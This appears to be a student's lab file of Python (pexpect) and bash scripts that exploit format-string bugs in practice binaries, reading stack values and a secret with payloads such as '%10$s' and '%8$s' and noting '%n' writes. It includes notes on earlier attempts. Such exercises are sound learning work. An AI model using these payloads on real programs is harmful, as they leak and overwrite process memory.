@@ -1,0 +1,159 @@
+#### reading address with input string code
+
+import pexpect, os, sys, tty
+
+# Spawn piped process of updated formatstring program
+p = pexpect.spawn("./formatstr-root2")
+
+for i in range(3):
+    l = p.readline()
+    print l
+
+# Extract the line and then string of target address
+line = p.readline()
+print "Target Line:" + line
+address = line[23:-12]
+address = address.replace(" ", "0")
+print "Address:" + address
+
+# Continue until input
+p.expect("Please enter a string")
+
+# Construct target address string
+s = address[8:10]
+s = s + " "+address[6:8]
+s = s + " "+address[4:6]
+s = s + " "+address[2:4]
+
+# Write target address string then convert to hex
+fwrite = open('file.hex', 'w')
+fwrite.write(s)
+fwrite.close()
+pexpect.run('xxd -p -r file.hex > file')
+pexpect.run("hexDump.sh")
+
+# Read hex data
+fread = open('file')
+data = fread.read()
+fread.close()
+
+# Set file descriptor to take raw input (allows command hex codes)
+tty.setraw(p.fileno())
+p.sendline(data+"%10$s")
+
+# Output rest
+for i in range(2):
+    l = p.readline()
+    print l
+
+print "secret[1] is: " + l[4]
+
+p.close()
+
+########################## past attempts
+
+import pexpect
+p = pexpect.spawn("./formatstr-root2")
+
+for i in range(3):
+    l = p.readline()
+    print l
+    
+line = p.readline()
+print "Line:" + line
+string = line[23:-12]
+string = string.replace(" ", "0")
+print "String:" + string
+
+# Read more lines until input
+p.expect("Please enter a string")
+
+# Construct input string
+s = "\\x"+string[8:10]
+s = s + "\\x"+string[6:8]
+s = s + "\\x"+string[4:6]
+s = s + "\\x"+string[2:4]
+#s = s + ".%10$x"
+
+print "s: "+s
+s = s.decode('string-escape')
+print "s decoded: "+s
+
+#z = "\x1c\xb0\x04\x08.%10$x"
+z = '\x1c\xb0\x04\x08.%10$x'
+z = u"\x1c\xb0\x04\x08.%10$x".encode(encoding='utf8')
+print "z: " + z
+
+p.sendline(u"\x1c\xb0\x04\x08.%10$x".encode(encoding='utf8'))
+#p.sendline(z)
+
+t = u'\x1c\xb0\x04\x08'
+print "t" + t
+
+for i in range(5):
+    l = p.readline()
+    print "? "+l
+
+print "wat \x41.\xb0.\04.\x08"
+
+p.close()
+
+############### bash sh 1
+#!/bin/bash
+v=41
+#echo -e $x "\x41\x41\x41\x41.%10\$d" | ./formatstring
+
+echo "Looping through to view stack"
+
+for i in {1..10}
+do
+    echo -e $v "%$i\$d" | ./formatstr-root
+    echo "done $i"
+    echo " "
+done
+
+echo " Reach input integer using format string direct access %9\$d"
+echo -e $v "%9\$d" | ./formatstr-root
+echo " "
+
+
+echo "Secret is 0x44 = 'D' which appeared at the 8th iteration, use format string direct access %8\$s"
+echo -e $v "%8\$s" | ./formatstr-root
+echo " "
+
+echo "%x reads the hex value, which matches the secret address"
+echo -e $v "%8\$p" | ./formatstr-root
+
+# task 1
+# reading address of inserted integer %9$s
+# writing address of inserted integer 12345%9$n or %100x%9$n (width specifier to avoid long strings)
+
+################## bash sh2 & invalid hex codes
+echo -e $x "\x1c\xb0\x04\x08.%10\$s" | ./formatstr-root2
+
+echo -e "\x00\x00\x00\x00%10\$x" | formatstr-root2
+# Prints nothing
+
+echo -e "\x0C\x0C\x0C\x0C%10\$x" | formatstr-root2
+# Formfeed - page breaking, considered whitespace
+
+
+echo -e "\x09\x09\x09\x09%10\$x" | formatstr-root2
+# Horizontal tabs
+
+echo -e "\x0D\x0D\x0D\x0D%10\$x" | formatstr-root2
+# Carriage Return - moves position of cursor to front of current line
+
+echo -e "\x0B\x0B\x0B\x0B%10\$x" | formatstr-root2
+# Vertical Tabs
+
+echo -e "\x0A\x0A\x0A\x0A%10\$x" | formatstr-root2
+# Newline
+
+echo -e "\x20\x20\x20\x20%10\$x" | formatstr-root2
+# Space
+
+#####
+
+
+
